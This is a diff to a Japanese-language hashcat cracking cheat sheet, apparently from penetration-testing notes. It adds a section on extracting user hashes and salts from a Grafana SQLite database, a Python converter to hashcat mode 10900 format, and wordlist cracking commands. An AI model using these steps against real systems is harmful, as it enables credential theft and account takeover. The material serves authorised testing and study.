@@ -10,6 +10,7 @@
 | `18200` | Kerberos AS-REP etype 23 | ASREPRoasting |
 | `1000` | NTLM | secretsdump / Pass-The-Hash |
 | `5600` | NetNTLMv2 | Responder / NTLM リレー |
+| `10900` | PBKDF2-HMAC-SHA256 | Grafana DB / 各種Webアプリ |
 | `0` | MD5 | 各種 |
 | `100` | SHA1 | 各種 |
 
@@ -97,6 +98,52 @@ cat ~/.hashcat/hashcat.potfile
 
 ---
 
+## PBKDF2-HMAC-SHA256（mode 10900）— Grafana 等のWebアプリ
+
+### 着火条件
+- Grafana の SQLite DB（`grafana.db`）からユーザーハッシュを取得した
+- ハッシュが HEX 文字列、salt が別カラムに格納されている
+
+### Hashcat 形式への変換
+
+Grafana はパスワードを PBKDF2-HMAC-SHA256（10000 反復、44バイト出力）でハッシュ化する。
+Hashcat の mode 10900 に渡すためには HEX → base64 変換が必要。
+
+```python
+import base64, binascii
+
+# sqlite3 grafana.db "SELECT login,password,salt FROM user;" で取得した値
+salt_str = '[SALT]'          # 例: LCBhdtJWjl
+hash_hex = '[HEX_HASH]'      # 例: dc6beccc...
+
+salt_b64  = base64.b64encode(salt_str.encode()).decode()
+hash_b64  = base64.b64encode(binascii.unhexlify(hash_hex)).decode()
+
+print(f'sha256:10000:{salt_b64}:{hash_b64}')
+# → sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45...
+```
+
+### クラックコマンド
+
+```bash
+hashcat -m 10900 "sha256:10000:[SALT_B64]:[HASH_B64]" \
+  /usr/share/wordlists/rockyou.txt --force
+```
+
+### 複数ハッシュをファイルで指定
+
+```bash
+# hashes.txt に変換済みハッシュを1行ずつ書いておく
+hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+### 注意点
+- `--force` が必要な場合が多い（GPU 最適化の問題）
+- 反復回数（10000）が多いため、GPU でも遅い。辞書を絞るか、ルールを使う
+- admin ハッシュが強固でもユーザー（一般）ハッシュがクラックできることがある
+
+---
+
 ## 注意点・落とし穴
 
 - `rockyou.txt` が見つからない場合: `/usr/share/wordlists/rockyou.txt` または `gunzip /usr/share/wordlists/rockyou.txt.gz`
@@ -108,3 +155,5 @@ cat ~/.hashcat/hashcat.potfile
 ## 関連技術
 - Kerberoasting ハッシュの取得 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md`
 - ASREPRoasting ハッシュの取得 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/ASREPRoasting.md`
+- Grafana DB からのハッシュ取得 → `../02_Initial_Access/Credential_Discovery.md`（パターン5）
+- Grafana パストラバーサルでの DB 取得 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
